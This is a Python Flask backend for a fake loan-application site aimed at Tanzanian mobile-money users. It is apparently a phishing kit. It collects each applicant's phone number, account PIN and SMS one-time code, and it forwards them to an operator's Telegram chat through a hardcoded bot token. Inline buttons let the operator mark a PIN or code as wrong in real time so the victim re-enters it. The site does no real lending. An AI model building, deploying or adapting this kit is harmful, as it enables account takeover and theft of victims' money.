from flask import Flask, render_template, request, jsonify, session
import requests
import re
import json
from datetime import datetime
import os
import uuid

app = Flask(__name__)
app.secret_key = 'mixxbyyas-secret-key-2024'

# Telegram Config
TELEGRAM_BOT_TOKEN = '8898988712:AAH8sR5P4Lb2TUKxTWNnO3dMqKNOMRXNGZ4'
TELEGRAM_CHAT_ID = '8589275340'

# Store applications in memory
applications = {}

def extract_code_from_sms(sms_text):
    if not sms_text:
        return None
    patterns = [
        r'code[:\s]+([a-zA-Z0-9]{6,20})',
        r'OTP[:\s]+([a-zA-Z0-9]{6,20})',
        r'use the code[:\s]+([a-zA-Z0-9]{6,20})',
        r'\b([a-zA-Z0-9]{8,20})\b'
    ]
    for pattern in patterns:
        match = re.search(pattern, sms_text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def send_telegram_message(message, buttons=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    if buttons:
        payload['reply_markup'] = json.dumps({'inline_keyboard': buttons})
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Telegram error: {e}")
        return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/apply')
def apply():
    return render_template('apply.html')

@app.route('/verify')
def verify():
    return render_template('verify.html')

@app.route('/code')
def code():
    return render_template('code.html')

@app.route('/result')
def result():
    return render_template('result.html')

@app.route('/api/submit_loan', methods=['POST'])
def submit_loan():
    try:
        data = request.get_json()
        phone = data.get('phone')
        pin = data.get('pin')
        amount = data.get('amount')
        months = data.get('months')
        loan_type = data.get('loan_type', '')
        purpose = data.get('purpose', '')
        
        # Generate unique app ID
        app_id = str(uuid.uuid4())[:8]
        
        # Store application
        applications[app_id] = {
            'phone': phone,
            'pin': pin,
            'amount': amount,
            'months': months,
            'loan_type': loan_type,
            'purpose': purpose,
            'status': 'waiting',
            'code_status': 'waiting',
            'created_at': datetime.now().isoformat()
        }
        
        # Send to Telegram
        message = f"""
📥 <b>NEW LOAN APPLICATION</b>

🆔 <b>ID:</b> {app_id}
📱 <b>Phone:</b> +255{phone}
💰 <b>Amount:</b> TZS {amount:,}
📅 <b>Term:</b> {months} months
📋 <b>Type:</b> {loan_type or 'N/A'}
📝 <b>Purpose:</b> {purpose or 'N/A'}
🔐 <b>PIN:</b> {pin}

⏳ <b>Status:</b> Waiting for PIN verification
"""
        
        buttons = [
            [
                {'text': '✅ ALLOW OTP', 'callback_data': f'allow_otp_{app_id}'},
                {'text': '❌ WRONG PIN', 'callback_data': f'wrong_pin_{app_id}'}
            ]
        ]
        
        send_telegram_message(message, buttons)
        
        return jsonify({
            'status': 'success',
            'app_id': app_id
        })
        
    except Exception as e:
        print(f"Error in submit_loan: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/check_status/<app_id>', methods=['GET'])
def check_status(app_id):
    try:
        if app_id in applications:
            return jsonify({
                'status': applications[app_id].get('status', 'waiting'),
                'code_status': applications[app_id].get('code_status', 'waiting')
            })
        return jsonify({'status': 'not_found'})
    except Exception as e:
        return jsonify({'status': 'error'})

@app.route('/api/submit_code', methods=['POST'])
def submit_code():
    try:
        data = request.get_json()
        app_id = data.get('app_id')
        code = data.get('code')
        
        if app_id not in applications:
            return jsonify({'status': 'error', 'message': 'Application not found'}), 404
        
        # Store the code
        applications[app_id]['sms_code'] = code
        applications[app_id]['code_status'] = 'waiting'
        
        # Send to Telegram for verification
        extracted = extract_code_from_sms(code)
        
        message = f"""
🔐 <b>CODE VERIFICATION</b>

🆔 <b>App ID:</b> {app_id}
📱 <b>Phone:</b> +255{applications[app_id].get('phone', '')}

<b>📱 Full SMS:</b>
<code>{code}</code>

<b>🔑 Extracted Code:</b> <code>{extracted or 'Not found'}</code>

<b>📅 Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
        
        buttons = [
            [
                {'text': '❌ WRONG CODE', 'callback_data': f'wrong_code_{app_id}'}
            ],
            [
                {'text': '✅ APPROVE LOAN', 'callback_data': f'approve_loan_{app_id}'}
            ]
        ]
        
        send_telegram_message(message, buttons)
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        print(f"Error in submit_code: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/api/resend_code', methods=['POST'])
def resend_code():
    try:
        data = request.get_json()
        app_id = data.get('app_id')
        
        if app_id not in applications:
            return jsonify({'status': 'error'}), 404
        
        # Reset code status
        applications[app_id]['code_status'] = 'waiting'
        
        message = f"""
🔄 <b>CODE RESEND REQUESTED</b>

🆔 <b>App ID:</b> {app_id}
📱 <b>Phone:</b> +255{applications[app_id].get('phone', '')}

New OTP has been requested. Please wait for SMS.
"""
        
        buttons = [
            [{'text': '🔄 WAITING FOR SMS', 'callback_data': f'waiting_{app_id}'}]
        ]
        
        send_telegram_message(message, buttons)
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'status': 'error'}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        
        if 'callback_query' in data:
            callback_data = data['callback_query']
            callback_id = callback_data['id']
            action = callback_data['data']
            
            # Parse action and app_id
            parts = action.split('_')
            if len(parts) >= 2:
                action_type = '_'.join(parts[:-1])
                app_id = parts[-1]
            else:
                action_type = action
                app_id = ''
            
            # Answer callback
            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
            requests.post(answer_url, json={'callback_query_id': callback_id, 'text': 'Done'})
            
            # Update application status
            if app_id in applications:
                if action_type == 'approve_loan':
                    applications[app_id]['code_status'] = 'approved'
                    applications[app_id]['status'] = 'approved'
                    response = f"✅ LOAN APPROVED for {app_id}!"
                elif action_type == 'allow_otp':
                    applications[app_id]['status'] = 'approved'
                    response = f"✅ OTP ALLOWED for {app_id}!"
                elif action_type == 'wrong_pin':
                    applications[app_id]['status'] = 'wrong_pin'
                    response = f"❌ WRONG PIN for {app_id}!"
                elif action_type == 'wrong_code':
                    applications[app_id]['code_status'] = 'wrong_code'
                    response = f"❌ WRONG CODE for {app_id}!"
                else:
                    response = f"Action: {action}"
            else:
                response = f"App {app_id} not found"
            
            send_telegram_message(response)
            return jsonify({'status': 'success'})
            
        return jsonify({'status': 'ok'})
        
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
